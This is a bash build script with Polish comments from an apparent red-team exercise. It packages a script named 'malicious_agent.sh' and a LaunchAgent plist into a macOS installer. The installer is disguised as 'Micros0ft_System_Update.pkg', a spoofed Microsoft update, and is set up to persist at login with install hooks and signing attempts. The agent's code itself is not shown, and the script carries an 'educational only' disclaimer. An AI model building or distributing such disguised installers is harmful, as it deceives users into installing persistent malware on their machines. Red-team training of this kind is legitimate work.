#!/bin/bash

# Skrypt budujący pakiet .pkg dla macOS
# Używa pkgbuild i productbuild do stworzenia instalatora

set -e

# Kolory
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Ścieżki
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
PKG_DIR="$SCRIPT_DIR"
PAYLOAD_DIR="$PKG_DIR/payload"
SCRIPTS_DIR="$PKG_DIR/scripts"
BUILD_DIR="$PKG_DIR/build"
DIST_DIR="$PKG_DIR/dist"

# Nazwy plików
PKG_NAME="MaliciousAgent"
FINAL_PKG_NAME="Micros0ft_System_Update.pkg"
VERSION="1.0"

echo -e "${BLUE}🔨 Budowanie pakietu .pkg${NC}"
echo "================================"

# Sprawdź czy jesteśmy na macOS
if [[ "$OSTYPE" != "darwin"* ]]; then
    echo -e "${RED}❌ BŁĄD: Ten skrypt wymaga macOS!${NC}"
    echo ""
    echo "Jesteś na systemie: $OSTYPE"
    echo ""
    echo "Opcje:"
    echo "1. Uruchom ten skrypt na maszynie z macOS"
    echo "2. Użyj maszyny wirtualnej z macOS"
    echo "3. Zobacz BUILD_INSTRUCTIONS.md dla więcej informacji"
    echo ""
    exit 1
fi

# Sprawdź dostępność narzędzi
if ! command -v pkgbuild &> /dev/null; then
    echo -e "${RED}❌ Błąd: pkgbuild nie jest dostępny${NC}"
    echo ""
    echo "Zainstaluj Xcode Command Line Tools:"
    echo "  xcode-select --install"
    echo ""
    echo "Następnie uruchom ponownie ten skrypt."
    exit 1
fi

if ! command -v productbuild &> /dev/null; then
    echo -e "${RED}❌ Błąd: productbuild nie jest dostępny${NC}"
    echo ""
    echo "Zainstaluj Xcode Command Line Tools:"
    echo "  xcode-select --install"
    echo ""
    echo "Następnie uruchom ponownie ten skrypt."
    exit 1
fi

# Utwórz katalogi
echo -e "${BLUE}📁 Tworzenie struktury katalogów...${NC}"
rm -rf "$BUILD_DIR" "$DIST_DIR" "$PAYLOAD_DIR"
mkdir -p "$BUILD_DIR" "$DIST_DIR" "$PAYLOAD_DIR"

# Przygotuj strukturę payload
echo -e "${BLUE}📦 Przygotowywanie payload...${NC}"

# Utwórz katalogi docelowe w payload
mkdir -p "$PAYLOAD_DIR/Library/LaunchAgents"
mkdir -p "$PAYLOAD_DIR/Users/Shared/Micros0ft/data"

# Skopiuj plik plist
cp "$PROJECT_ROOT/red_team/agent/com.bugbusters.malicious.plist" \
   "$PAYLOAD_DIR/Library/LaunchAgents/com.bugbusters.malicious.plist"

# Skopiuj skrypt agenta
cp "$PROJECT_ROOT/red_team/malicious_agent.sh" \
   "$PAYLOAD_DIR/Users/Shared/Micros0ft/malicious_agent.sh"

# Ustaw uprawnienia dla skryptów
chmod +x "$PAYLOAD_DIR/Users/Shared/Micros0ft/malicious_agent.sh"
chmod +x "$SCRIPTS_DIR/preinstall"
chmod +x "$SCRIPTS_DIR/postinstall"

# Buduj komponent pakietu
echo -e "${BLUE}🔨 Budowanie komponentu pakietu...${NC}"
pkgbuild \
    --root "$PAYLOAD_DIR" \
    --scripts "$SCRIPTS_DIR" \
    --identifier "com.bugbusters.malicious" \
    --version "$VERSION" \
    --install-location "/" \
    --sign "Developer ID Installer" 2>/dev/null || \
pkgbuild \
    --root "$PAYLOAD_DIR" \
    --scripts "$SCRIPTS_DIR" \
    --identifier "com.bugbusters.malicious" \
    --version "$VERSION" \
    --install-location "/" \
    "$BUILD_DIR/$PKG_NAME.pkg"

# Buduj finalny pakiet z Distribution.xml
echo -e "${BLUE}🔨 Budowanie finalnego pakietu instalacyjnego...${NC}"
productbuild \
    --distribution "$PKG_DIR/Distribution.xml" \
    --package-path "$BUILD_DIR" \
    --resources "$PKG_DIR" \
    --sign "Developer ID Installer" 2>/dev/null || \
productbuild \
    --distribution "$PKG_DIR/Distribution.xml" \
    --package-path "$BUILD_DIR" \
    --resources "$PKG_DIR" \
    "$DIST_DIR/$FINAL_PKG_NAME"

# Sprawdź czy pakiet został utworzony
if [ -f "$DIST_DIR/$FINAL_PKG_NAME" ]; then
    PKG_SIZE=$(du -h "$DIST_DIR/$FINAL_PKG_NAME" | cut -f1)
    echo ""
    echo -e "${GREEN}✅ Pakiet został pomyślnie utworzony!${NC}"
    echo "📦 Lokalizacja: $DIST_DIR/$FINAL_PKG_NAME"
    echo "📊 Rozmiar: $PKG_SIZE"
    echo ""
    echo -e "${YELLOW}⚠️  OSTRZEŻENIE: To narzędzie jest tylko do celów edukacyjnych!${NC}"
    echo "Używaj tylko na własnym sprzęcie lub maszynach wirtualnych."
    echo ""
    echo "Aby zainstalować pakiet, uruchom:"
    echo "  open $DIST_DIR/$FINAL_PKG_NAME"
else
    echo -e "${YELLOW}❌ Błąd: Nie udało się utworzyć pakietu${NC}"
    exit 1
fi

